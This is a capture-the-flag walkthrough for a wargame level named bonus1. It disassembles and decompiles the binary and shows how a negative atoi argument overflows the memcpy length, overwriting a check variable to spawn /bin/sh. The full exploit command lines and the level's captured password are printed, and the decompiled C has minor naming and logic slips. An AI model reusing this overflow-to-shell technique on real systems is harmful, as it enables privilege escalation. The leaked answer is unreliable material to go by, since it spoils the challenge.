## bonus1
Here is the objdump for bonus1
```
08048424 <main>:
 8048424:       55                      push   ebp
 8048425:       89 e5                   mov    ebp,esp
 8048427:       83 e4 f0                and    esp,0xfffffff0
 804842a:       83 ec 40                sub    esp,0x40
 804842d:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048430:       83 c0 04                add    eax,0x4
 8048433:       8b 00                   mov    eax,DWORD PTR [eax]
 8048435:       89 04 24                mov    DWORD PTR [esp],eax
 8048438:       e8 23 ff ff ff          call   8048360 <atoi@plt>
 804843d:       89 44 24 3c             mov    DWORD PTR [esp+0x3c],eax
 8048441:       83 7c 24 3c 09          cmp    DWORD PTR [esp+0x3c],0x9
 8048446:       7e 07                   jle    804844f <main+0x2b>
 8048448:       b8 01 00 00 00          mov    eax,0x1
 804844d:       eb 54                   jmp    80484a3 <main+0x7f>
 804844f:       8b 44 24 3c             mov    eax,DWORD PTR [esp+0x3c]
 8048453:       8d 0c 85 00 00 00 00    lea    ecx,[eax*4+0x0]
 804845a:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804845d:       83 c0 08                add    eax,0x8
 8048460:       8b 00                   mov    eax,DWORD PTR [eax]
 8048462:       89 c2                   mov    edx,eax
 8048464:       8d 44 24 14             lea    eax,[esp+0x14]
 8048468:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
 804846c:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048470:       89 04 24                mov    DWORD PTR [esp],eax
 8048473:       e8 a8 fe ff ff          call   8048320 <memcpy@plt>
 8048478:       81 7c 24 3c 46 4c 4f    cmp    DWORD PTR [esp+0x3c],0x574f4c46
 804847f:       57
 8048480:       75 1c                   jne    804849e <main+0x7a>
 8048482:       c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
 8048489:       00
 804848a:       c7 44 24 04 80 85 04    mov    DWORD PTR [esp+0x4],0x8048580
 8048491:       08
 8048492:       c7 04 24 83 85 04 08    mov    DWORD PTR [esp],0x8048583
 8048499:       e8 b2 fe ff ff          call   8048350 <execl@plt>
 804849e:       b8 00 00 00 00          mov    eax,0x0
 80484a3:       c9                      leave
 80484a4:       c3                      ret
 80484a5:       90                      nop
 80484a6:       90                      nop
 80484a7:       90                      nop
 80484a8:       90                      nop
 80484a9:       90                      nop
 80484aa:       90                      nop
 80484ab:       90                      nop
 80484ac:       90                      nop
 80484ad:       90                      nop
 80484ae:       90                      nop
 80484af:       90                      nop
```
```clike=
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    int atoi_ret;
    char buf[40]; // we allocated 64 bytes at 804842a, - atoi_res size (4) - esp offset (20)
    
    // 8048438
    atoi_ret = atoi(argv[1]);
    if (atoi_ret <= 9)
    {
        int len;
        
        // 8048453
        len = atoi_res * 4;
        
        // 8048473
        memcpy(buf, argv[2], len);
        
        if (atoi_ret != 1464814662) // or 0x574f4c46
            return 1;
        else
            execl("/bin/sh", "sh");
    }
    else
        return 1;
}
```

Based on instructions `804843d` and `8048464`, we are able to determine the sizes and position of the `atoi_ret` and the `buf` variables. They are positioned next to each other at `esp + 0x3c` for `atoi_res` and `esp + 0x14` for `buf`. Which means `buf` needs at least 41 bytes to overwrite`atoi_ret`. This is not possible through normal input because we are capped at 9 for the atoi, which makes our max input length `9 * 4 = 36` bytes long when we put the largest possible number.

However, there is not restrictions on the minimum value, which may cause overflow when I multiply the minimum value by 4. As we can see, the length of memcpy is stored in `ecx` when the user inputs `-2000000000 asd`. The system tries to multiply -2000000000 by 4 which resulted in a large positive number, as the real result needs more than 8 bytes to store.

And since we can copy a big length now, we can try to overwrite `atoi_ret` with a `argv[2]` of 41 bytes.
```
-2000000000 `python -c "print 'B' * 41"`
```
![image](https://hackmd.io/_uploads/r1bRMiM8T.png)

Now to really determine how big of a string we want to copy. Through some trials I observed the overflow wraps around the `MIN_INT / 4 - n` like so. As we can see, every digit we deduct from MIN_INT, we will deduct 4 from MAX_INT in the output.
When we try `MIN_INT / 2` however, the behaviour changes
```
MIN_INT / 4 - 1 -> MAX_INT - 3
MIN_INT / 4 - 2 -> MAX_INT - 7
MIN_INT / 4 - 3 -> MAX_INT - 11
MIN_INT / 4 - 4 -> MAX_INT - 15
...
...

MIN_INT / 2 -> 0
MIN_INT / 2 + 1 -> 4
MIN_INT / 2 + 2 -> 8
MIN_INT / 2 + 3 -> 12
```
We can use this to slowly adjust our memcpy length to at 64 bytes, which our input needs to be `MIN_INT / 2 + 16` or `
```
-1073741808 `python -c "print 'B' * 41"`
```

As we can see, we successfully overwritten `atoi_res` to our dummy input. Now we have to overwrite it with the desired input which is `0x574f4c46`.
![image](https://hackmd.io/_uploads/BkOytszLa.png)

After changing the input to the one below, 
```
-1073741808 `python -c "print 'B' * 40 + '\x57\x4f\x4c\x46'[::-1]"`
```

We are able to get the password for the next level`579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`

![image](https://hackmd.io/_uploads/Hkq1qiMUa.png)

